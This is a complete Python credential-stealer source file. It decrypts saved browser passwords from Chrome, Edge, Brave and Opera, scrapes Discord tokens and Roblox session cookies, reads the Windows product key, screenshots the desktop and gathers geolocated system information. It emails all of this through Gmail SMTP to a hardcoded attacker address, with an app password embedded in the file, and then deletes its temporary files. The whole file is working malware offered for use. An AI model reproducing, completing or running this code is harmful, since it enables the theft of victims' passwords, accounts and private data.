import os
import platform
import psutil
import socket
import json
import requests
import re
import sqlite3
import shutil
import base64
import subprocess
from datetime import datetime
from uuid import getnode as get_mac
from PIL import ImageGrab
import zipfile
import smtplib
from email.message import EmailMessage
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import ctypes
import ctypes.wintypes
import browser_cookie3

# === CONFIG ===
EMAIL_SENDER = "ysflnt1@gmail.com"
EMAIL_PASSWORD = "ncwb npus wsem maxw"  # Replace with your Gmail app password!
EMAIL_RECEIVER = "ysflnt1@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# === UTILITIES ===

def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined

# DPAPI decrypt (Windows only)
class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', ctypes.wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_char))]

def dpapi_decrypt(encrypted_bytes):
    p = ctypes.create_string_buffer(encrypted_bytes, len(encrypted_bytes))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout)) == 0:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def get_master_key(browser_name, profile_path):
    # This reads Local State file which is common to all profiles under the browser's User Data root
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], browser_name, "User Data", "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove DPAPI prefix
    return dpapi_decrypt(encrypted_key)

def aes_gcm_decrypt(ciphertext, key):
    nonce = ciphertext[3:15]
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_pass = decryptor.update(ciphertext[15:-16]) + decryptor.finalize()
    return decrypted_pass

def decrypt_password(encrypted_password, master_key):
    try:
        if encrypted_password[:3] == b'v10':
            return aes_gcm_decrypt(encrypted_password, master_key).decode('utf-8', errors='ignore')
        else:
            return dpapi_decrypt(encrypted_password).decode('utf-8', errors='ignore')
    except Exception:
        return ""

def extract_passwords_from_profile(browser_name, profile_path):
    login_db_path = os.path.join(profile_path, "Login Data")
    if not os.path.exists(login_db_path):
        return []
    temp_db_path = os.path.join(os.getenv('TEMP'), "LoginDataTemp.db")
    try:
        shutil.copy2(login_db_path, temp_db_path)
    except Exception:
        return []
    master_key = get_master_key(browser_name, profile_path)
    if not master_key:
        return []
    passwords = []
    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username or decrypted_password:
                passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*30}")
        cursor.close()
        conn.close()
    except Exception:
        pass
    finally:
        if os.path.exists(temp_db_path):
            os.remove(temp_db_path)
    return passwords

def extract_all_passwords():
    browsers = {
        'Google\\Chrome': os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
        'Microsoft\\Edge': os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
        'BraveSoftware\\Brave-Browser': os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
        'Opera Software\\Opera Stable': os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable"),
    }

    all_passwords = []

    for browser_name_raw, base_path in browsers.items():
        browser_name = browser_name_raw.replace('\\', '\\')  # just to keep for master key call
        if not os.path.exists(base_path):
            continue
        # Profiles are folders inside User Data (like Default, Profile 1, etc.)
        for profile in os.listdir(base_path):
            profile_path = os.path.join(base_path, profile)
            if not os.path.isdir(profile_path):
                continue
            pwds = extract_passwords_from_profile(browser_name_raw, profile_path)
            if pwds:
                all_passwords.extend(pwds)

    # Firefox is different - no DPAPI, no master key, older encryption
    # Firefox password extraction requires a different approach; skipping for brevity

    return all_passwords

def grab_tokens():
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': os.path.join(roaming, 'Discord'),
        'Discord Canary': os.path.join(roaming, 'discordcanary'),
        'Discord PTB': os.path.join(roaming, 'discordptb'),
        'Discord Development': os.path.join(roaming, 'discorddevelopment'),
        'Google Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
    }
    token_regexes = [r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}']
    tokens = []
    for platform, path in paths.items():
        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
        if not os.path.exists(leveldb_path):
            continue
        for file_name in os.listdir(leveldb_path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            try:
                with open(os.path.join(leveldb_path, file_name), errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        for regex in token_regexes:
                            matches = re.findall(regex, line)
                            if matches:
                                tokens.extend(matches)
            except Exception:
                continue
    return list(set(tokens))

def grab_cookies():
    target_cookie_name = ".ROBLOSECURITY"
    cookies_found = []
    try:
        cookies_found.extend([cookie for cookie in browser_cookie3.chrome() if cookie.name == target_cookie_name])
    except Exception:
        pass
    try:
        cookies_found.extend([cookie for cookie in browser_cookie3.firefox() if cookie.name == target_cookie_name])
    except Exception:
        pass
    return cookies_found

def get_windows_product_key():
    try:
        key = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        os_name = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
        return key, os_name
    except Exception:
        return None, None

def take_screenshot(filepath):
    try:
        img = ImageGrab.grab()
        img.save(filepath)
        return True
    except Exception:
        return False

def get_system_info():
    uname = platform.uname()
    bt = datetime.fromtimestamp(psutil.boot_time())
    host = socket.gethostname()
    local_ip = socket.gethostbyname(host)
    try:
        public_ip = requests.get('https://api.ipify.org').text
        geo = requests.get(f'https://ipapi.co/{public_ip}/json').json()
        proxy = requests.get('http://ip-api.com/json?fields=proxy').json().get('proxy', False)
    except Exception:
        public_ip = "N/A"
        geo = {}
        proxy = False

    mem = psutil.virtual_memory()
    cpu_freq = psutil.cpu_freq()
    disk = psutil.disk_usage(os.getenv("SystemDrive") + "\\")
    net_io = psutil.net_io_counters()
    mac = ':'.join(re.findall('..', '%012x' % get_mac()))

    info = {
        "System": uname.system,
        "Node": uname.node,
        "Release": uname.release,
        "Version": uname.version,
        "Machine": uname.machine,
        "Processor": uname.processor,
        "Boot Time": bt.strftime("%Y-%m-%d %H:%M:%S"),
        "Hostname": host,
        "Local IP": local_ip,
        "Public IP": public_ip,
        "VPN or Proxy?": proxy,
        "MAC Address": mac,
        "Country": geo.get('country_name', 'N/A'),
        "Region": geo.get('region', 'N/A'),
        "City": geo.get('city', 'N/A'),
        "Timezone": geo.get('timezone', 'N/A'),
        "Currency": geo.get('currency', 'N/A'),
        "CPU Physical Cores": psutil.cpu_count(logical=False),
        "CPU Total Cores": psutil.cpu_count(logical=True),
        "CPU Max Frequency MHz": cpu_freq.max if cpu_freq else 'N/A',
        "CPU Min Frequency MHz": cpu_freq.min if cpu_freq else 'N/A',
        "CPU Usage %": psutil.cpu_percent(interval=1),
        "Memory Total": scale(mem.total),
        "Memory Available": scale(mem.available),
        "Memory Used": scale(mem.used),
        "Memory Percentage": mem.percent,
        "Disk Total": scale(disk.total),
        "Disk Used": scale(disk.used),
        "Disk Free": scale(disk.free),
        "Disk Percentage": disk.percent,
        "Network Sent": scale(net_io.bytes_sent),
        "Network Received": scale(net_io.bytes_recv),
    }
    return info

def compose_email(system_info, tokens, roblox_cookies, windows_key_info, screenshot_path, passwords_zip_path):
    msg = EmailMessage()
    msg['Subject'] = f"Collected Info from {system_info['Hostname']}"
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER

    body = f"""\ 
System Information:
-------------------
System: {system_info['System']}
Node: {system_info['Node']}
Release: {system_info['Release']}
Version: {system_info['Version']}
Machine: {system_info['Machine']}
Processor: {system_info['Processor']}
Boot Time: {system_info['Boot Time']}

Network Info:
-------------
Hostname: {system_info['Hostname']}
Local IP: {system_info['Local IP']}
Public IP: {system_info['Public IP']}
VPN/Proxy: {system_info['VPN or Proxy?']}
MAC Address: {system_info['MAC Address']}

Location:
---------
Country: {system_info['Country']}
Region: {system_info['Region']}
City: {system_info['City']}
Timezone: {system_info['Timezone']}
Currency: {system_info['Currency']}

CPU:
----
Physical cores: {system_info['CPU Physical Cores']}
Total cores: {system_info['CPU Total Cores']}
Max Frequency: {system_info['CPU Max Frequency MHz']} MHz
Min Frequency: {system_info['CPU Min Frequency MHz']} MHz
CPU Usage: {system_info['CPU Usage %']} %

Memory:
-------
Total: {system_info['Memory Total']}
Available: {system_info['Memory Available']}
Used: {system_info['Memory Used']}
Percentage: {system_info['Memory Percentage']} %

Disk:
-----
Total: {system_info['Disk Total']}
Used: {system_info['Disk Used']}
Free: {system_info['Disk Free']}
Percentage: {system_info['Disk Percentage']} %

Network I/O:
------------
Sent: {system_info['Network Sent']}
Received: {system_info['Network Received']}

Windows Product Key:
--------------------
OS Name: {windows_key_info[1]}
Product Key: {windows_key_info[0]}

Discord/Other Tokens:
---------------------
{chr(10).join(tokens) if tokens else 'No tokens found.'}

Roblosecurity Cookies:
----------------------
{chr(10).join(cookie.value for cookie in roblox_cookies) if roblox_cookies else 'No .ROBLOSECURITY cookies found.'}

Passwords are attached as a ZIP file.
Screenshot is attached as well.
"""

    msg.set_content(body)

    # Attach passwords.zip
    with open(passwords_zip_path, 'rb') as f:
        msg.add_attachment(f.read(), maintype='application', subtype='zip', filename='passwords.zip')

    # Attach screenshot
    with open(screenshot_path, 'rb') as f:
        msg.add_attachment(f.read(), maintype='image', subtype='png', filename='screenshot.png')

    return msg

def main():
    print("[*] Collecting passwords from multiple browsers...")
    passwords = extract_all_passwords()
    if not passwords:
        passwords = ["No passwords found."]
    passwords_text = "\n\n".join(passwords)

    temp_dir = os.path.join(os.getenv('TEMP'), "collector")
    os.makedirs(temp_dir, exist_ok=True)
    passwords_txt_path = os.path.join(temp_dir, "passwords.txt")
    passwords_zip_path = os.path.join(temp_dir, "passwords.zip")
    screenshot_path = os.path.join(temp_dir, "screenshot.png")

    print("[*] Writing passwords.txt...")
    with open(passwords_txt_path, 'w', encoding='utf-8') as f:
        f.write(passwords_text)

    print("[*] Creating passwords.zip...")
    with zipfile.ZipFile(passwords_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(passwords_txt_path, arcname="passwords.txt")

    print("[*] Taking screenshot...")
    take_screenshot(screenshot_path)

    print("[*] Grabbing Discord tokens...")
    tokens = grab_tokens()

    print("[*] Grabbing Roblox cookies...")
    roblox_cookies = grab_cookies()

    print("[*] Getting Windows product key...")
    windows_key_info = get_windows_product_key()

    print("[*] Collecting system info...")
    system_info = get_system_info()

    print("[*] Composing email...")
    msg = compose_email(system_info, tokens, roblox_cookies, windows_key_info, screenshot_path, passwords_zip_path)

    print("[*] Sending email...")
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)
        print("[+] Email sent successfully!")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")

    # Cleanup
    try:
        os.remove(passwords_txt_path)
        os.remove(passwords_zip_path)
        os.remove(screenshot_path)
        os.rmdir(temp_dir)
    except Exception:
        pass

if __name__ == "__main__":
    main()
